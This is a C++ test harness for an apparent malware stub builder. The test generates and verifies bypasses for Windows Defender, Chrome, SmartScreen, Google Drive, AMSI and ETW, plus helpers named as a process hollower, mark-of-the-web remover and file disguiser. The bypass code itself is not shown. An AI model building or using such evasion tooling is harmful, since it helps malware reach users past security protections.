#include <iostream>
#include <string>
#include <vector>
#include "enhanced_bypass_generator.h"

int main() {
    try {
        std::cout << "Testing EnhancedBypassGenerator integration..." << std::endl;
        
        // Create an instance of EnhancedBypassGenerator
        EnhancedBypassGenerator bypassGenerator;
        std::cout << "✓ EnhancedBypassGenerator instance created successfully" << std::endl;
        
        // Test individual bypass generations
        std::cout << "\nTesting individual bypass techniques..." << std::endl;
        
        std::string defenderBypass = bypassGenerator.generateWindowsDefenderBypass();
        std::cout << "✓ Windows Defender bypass generated (" << defenderBypass.length() << " characters)" << std::endl;
        
        std::string chromeBypass = bypassGenerator.generateChromeBypass();
        std::cout << "✓ Chrome bypass generated (" << chromeBypass.length() << " characters)" << std::endl;
        
        std::string smartscreenBypass = bypassGenerator.generateSmartScreenBypass();
        std::cout << "✓ SmartScreen bypass generated (" << smartscreenBypass.length() << " characters)" << std::endl;
        
        std::string gdriveBypass = bypassGenerator.generateGoogleDriveBypass();
        std::cout << "✓ Google Drive bypass generated (" << gdriveBypass.length() << " characters)" << std::endl;
        
        // Test bypass configuration
        std::cout << "\nTesting bypass configuration..." << std::endl;
        EnhancedBypassGenerator::BypassConfig config;
        config.windowsDefender = true;
        config.chrome = true;
        config.smartScreen = true;
        config.googleDrive = true;
        config.amsi = true;
        config.etw = true;
        std::cout << "✓ Bypass configuration created" << std::endl;
        
        // Generate full bypass stub
        std::string fullStub = bypassGenerator.generateFullBypassStub(config);
        std::cout << "✓ Full bypass stub generated (" << fullStub.length() << " characters)" << std::endl;
        
        // Verify stub contains expected elements
        bool hasAmsi = fullStub.find("AMSI") != std::string::npos || fullStub.find("amsi") != std::string::npos;
        bool hasEtw = fullStub.find("ETW") != std::string::npos || fullStub.find("etw") != std::string::npos;
        bool hasDefender = fullStub.find("Defender") != std::string::npos || fullStub.find("defender") != std::string::npos;
        bool hasWinMain = fullStub.find("WinMain") != std::string::npos;
        bool hasInclude = fullStub.find("#include") != std::string::npos;
        
        std::cout << "\nStub verification:" << std::endl;
        std::cout << "✓ Contains AMSI bypass: " << (hasAmsi ? "Yes" : "No") << std::endl;
        std::cout << "✓ Contains ETW bypass: " << (hasEtw ? "Yes" : "No") << std::endl;
        std::cout << "✓ Contains Defender bypass: " << (hasDefender ? "Yes" : "No") << std::endl;
        std::cout << "✓ Contains WinMain function: " << (hasWinMain ? "Yes" : "No") << std::endl;
        std::cout << "✓ Contains includes: " << (hasInclude ? "Yes" : "No") << std::endl;
        
        // Test function name generation and consistency
        auto functionNames = bypassGenerator.getFunctionNames();
        std::cout << "\nGenerated function names:" << std::endl;
        for (const auto& name : {functionNames.amsiBypasser, functionNames.etwBypasser, 
                                functionNames.debuggerHelper, functionNames.processHollower,
                                functionNames.motwRemover, functionNames.chromeHeaders,
                                functionNames.fileDisguiser, functionNames.smartScreenReg}) {
            if (!name.empty()) {
                std::cout << "✓ Function: " << name;
                // Verify names start with a letter (C++ requirement)
                bool validName = !name.empty() && std::isalpha(name[0]);
                std::cout << " (valid: " << (validName ? "Yes" : "No") << ")" << std::endl;
                if (!validName) {
                    std::cerr << "❌ Invalid function name detected: " << name << std::endl;
                    return 1;
                }
            }
        }
        
        // Test that stub contains the generated function names
        bool allFunctionsFound = true;
        for (const auto& name : {functionNames.amsiBypasser, functionNames.etwBypasser, 
                                functionNames.debuggerHelper, functionNames.processHollower,
                                functionNames.motwRemover, functionNames.chromeHeaders,
                                functionNames.fileDisguiser, functionNames.smartScreenReg}) {
            if (!name.empty() && fullStub.find(name) == std::string::npos) {
                std::cerr << "❌ Function " << name << " not found in generated stub" << std::endl;
                allFunctionsFound = false;
            }
        }
        
        if (allFunctionsFound) {
            std::cout << "✓ All generated function names found in stub" << std::endl;
        }
        
        std::cout << "\n✅ All EnhancedBypassGenerator tests passed!" << std::endl;
        return 0;
        
    } catch (const std::exception& e) {
        std::cerr << "❌ Error: " << e.what() << std::endl;
        return 1;
    }
}